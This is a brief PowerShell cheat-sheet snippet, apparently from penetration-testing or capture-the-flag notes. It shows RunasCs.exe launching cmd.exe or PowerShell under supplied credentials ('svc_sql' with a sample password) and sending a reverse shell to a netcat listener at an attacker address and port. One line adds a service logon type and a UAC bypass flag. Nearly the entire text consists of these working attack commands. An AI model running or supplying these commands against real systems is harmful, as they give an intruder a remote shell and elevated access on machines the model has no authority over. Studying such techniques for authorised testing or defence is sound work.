
```powershell
# run it remotly to nc listener
.\runasCs.exe <user> <password> cmd.exe -r <IP>:<PORT>

.\RunasCs.exe svc_sql 'StrongPassword123' powershell -l 5 -b -r 10.10.X.X:4411
# -l 5 is for service logon type
# -b bypass uac
```
